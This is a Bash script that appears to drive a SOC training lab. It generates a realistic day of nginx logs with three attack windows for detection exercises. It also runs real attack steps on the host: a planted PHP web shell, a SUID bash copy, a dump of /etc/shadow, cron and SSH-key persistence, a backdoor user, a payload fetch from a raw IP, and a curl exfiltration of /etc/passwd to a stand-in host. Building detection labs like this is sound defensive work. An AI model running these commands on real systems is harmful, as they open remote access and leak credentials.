#!/bin/bash
# ==========================================================================
#  Operation Shadow Gate — Linux Attack Simulation (realistic mixed-day)
#  Target:  LNX-VICTIM01 (Ubuntu, nginx + Wazuh agent enrolled)
#  Run as:  root
#
#  MODEL: ~1500 nginx access lines representing a normal business day, with
#  three separate attack windows woven in at different times (NOT one burst):
#     Window A (~09:15) — Web recon + brute-force
#     Window B (~13:40) — Web exploitation + malware download from C2
#     Window C (~16:05) — Privilege escalation + persistence + exfil
#  Each window uses different attacker IPs, User-Agents, URLs, and status
#  codes so students must correlate on multiple indicators, not just one.
# ==========================================================================
set -u
[[ $EUID -ne 0 ]] && { echo "Run as root."; exit 1; }

ACCESS=/var/log/nginx/access-json.log
LOG=/tmp/shadowgate-linux.log; : > "$LOG"
say(){ echo "[$(date +%T)] $*" | tee -a "$LOG"; }
mkdir -p /var/log/nginx /var/www/html

# ---- pools for realistic normal traffic --------------------------------
# Realistic PUBLIC client mix — well-known benign provider ranges
NORMAL_IPS=(
  8.8.8.{1..250} 8.34.{208..223}.{1..250}          # Google
  1.1.1.{1..250} 104.16.{0..40}.{1..250}           # Cloudflare
  13.107.{6..21}.{1..250} 20.190.{128..190}.{1..250} # Microsoft
  17.253.{1..40}.{1..250}                          # Apple
  151.101.{0..64}.{1..250}                         # Fastly
  140.82.{112..121}.{1..250}                       # GitHub
  199.232.{1..40}.{1..250} 185.199.{108..111}.{1..250}
)
NORMAL_UAS=(
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
 "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
 "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148"
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15"
)
NORMAL_URLS=(/ /index.html /about /products /contact /css/style.css /js/app.js
 /img/logo.png /favicon.ico /api/status /login /dashboard /cart /search?q=shoes)
OK_CODES=(200 200 200 200 304 200 302 200 404)

# write one json access line with a chosen timestamp
emit(){ # ip method url status ua ts
  printf '{"srcip":"%s","time":"%s","method":"%s","url":"%s","status":%s,"size":%s,"referer":"-","user_agent":"%s"}\n' \
    "$1" "$6" "$2" "$3" "$4" "$((RANDOM%4000+120))" "$5" >> "$ACCESS"
}
ts(){ date -d "2026-07-26 $1:$(printf '%02d' $((RANDOM%60))):$(printf '%02d' $((RANDOM%60)))" '+%d/%b/%Y:%H:%M:%S +0300'; }

rip(){ echo "${NORMAL_IPS[RANDOM % ${#NORMAL_IPS[@]}]}"; }
rua(){ echo "${NORMAL_UAS[RANDOM % ${#NORMAL_UAS[@]}]}"; }
rurl(){ echo "${NORMAL_URLS[RANDOM % ${#NORMAL_URLS[@]}]}"; }
rcode(){ echo "${OK_CODES[RANDOM % ${#OK_CODES[@]}]}"; }

# spread N normal lines across an hour range (h1..h2)
normal_block(){ # count h1 h2
  for _ in $(seq 1 "$1"); do
    emit "$(rip)" GET "$(rurl)" "$(rcode)" "$(rua)" "$(ts "$(( $2 + RANDOM % ($3-$2+1) ))")"
  done
}

say "=== Shadow Gate Linux — generating realistic day + 3 attack windows ==="

# ======================================================================
#  MORNING normal traffic 08:00–09:00  (~450 lines)
# ======================================================================
say "[08:00-09:00] normal morning traffic"
normal_block 450 8 8

# ======================================================================
#  WINDOW A — 09:15  Web recon + SSH brute-force
#  IOC set: attacker 198.51.100.23 · UA sqlmap/nikto · 401/404 spikes
# ======================================================================
say "[09:15] WINDOW A — recon + brute force (198.51.100.23)"
A_IP=198.51.100.23
for u in "/admin" "/login.php" "/wp-login.php" "/.git/config" "/backup.zip" "/phpmyadmin"; do
  emit "$A_IP" GET "$u" 404 "sqlmap/1.7.11#stable (https://sqlmap.org)" "$(ts 9)"
done
emit "$A_IP" GET "/index.php?id=1'%20OR%201=1--" 500 "sqlmap/1.7.11#stable" "$(ts 9)"
emit "$A_IP" GET "/admin/" 403 "Nikto/2.5.0" "$(ts 9)"
# real SSH brute-force so auth.log + rule 100101 fire
for i in $(seq 1 12); do
  sshpass -p "pass$i" ssh -o StrictHostKeyChecking=no -o PubkeyAuthentication=no \
    -o ConnectTimeout=2 attacker@127.0.0.1 true >/dev/null 2>&1 &
done; wait
logger -t sshd -p auth.info "Accepted password for socadmin from ${A_IP} port 51422 ssh2"

normal_block 300 9 11   # midday normal 09:00–11:00

# ======================================================================
#  WINDOW B — 13:40  Web exploitation + malware pull from C2
#  IOC set: attacker 203.0.113.50 · UA curl/wget · downloads EICAR from
#  malicious domain/IP in our CDB lists
# ======================================================================
say "[13:40] WINDOW B — exploitation + malware download (203.0.113.50)"
B_IP=203.0.113.50
emit "$B_IP" GET "/../../../../etc/passwd" 200 "curl/8.5.0" "$(ts 13)"
emit "$B_IP" POST "/upload.php" 200 "python-requests/2.31" "$(ts 13)"
emit "$B_IP" GET "/shell.php?cmd=id" 200 "Mozilla/5.0 (compatible; MSIE 10.0; CobaltStrike)" "$(ts 13)"
# drop web shell (rule 100103)
cat > /var/www/html/shell.php <<'PHP'
<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>
PHP
# malware download from C2 (safe EICAR served locally as if from C2 domain)
curl -s -A "Mozilla/5.0 (compatible; MSIE 10.0; CobaltStrike)" -o /dev/null \
  http://testmynids.org/uid/index.html
curl -s --connect-timeout 3 -o /tmp/staging_beacon "http://162.243.103.246/beacon.bin" 2>/dev/null || true
mkdir -p /tmp/staging
printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/staging/beacon.bin
sha256sum /tmp/staging/beacon.bin | tee -a "$LOG"

normal_block 300 14 15  # afternoon normal 14:00–15:00

# ======================================================================
#  WINDOW C — 16:05  Privilege escalation + persistence + exfil
#  IOC set: local actions + exfil to 192.0.2.100
# ======================================================================
say "[16:05] WINDOW C — privesc + persistence + exfil"
cp /bin/bash /tmp/.bash-suid && chmod 4755 /tmp/.bash-suid    # SUID (100105)
cat /etc/shadow > /tmp/.shadow.dump 2>/dev/null               # shadow read (100104)
echo "* * * * * root curl -s http://testmynids.org/uid/index.html" > /etc/cron.d/sysupd  # cron (100106)
mkdir -p /root/.ssh; echo "ssh-rsa AAAAB3Nz...shadowgate@attacker" >> /root/.ssh/authorized_keys  # key (100107)
useradd -m -s /bin/bash svc_backup 2>/dev/null; echo "svc_backup:P@ss!" | chpasswd            # user (100108)
curl -s --connect-timeout 3 -X POST --data-binary @/etc/passwd "http://192.0.2.100/x" >/dev/null 2>&1 || true  # exfil (100112)

normal_block 150 16 17  # end-of-day normal 16:00–17:00

TOTAL=$(wc -l < "$ACCESS")
say "=== done. nginx access lines now: ${TOTAL} (~1500 target) ==="
say "Attack windows: A 09:15 (recon/brute) · B 13:40 (exploit/malware) · C 16:05 (privesc/exfil)"
say "Rules expected: 100100-100112, 100300/100301/100302/100304"
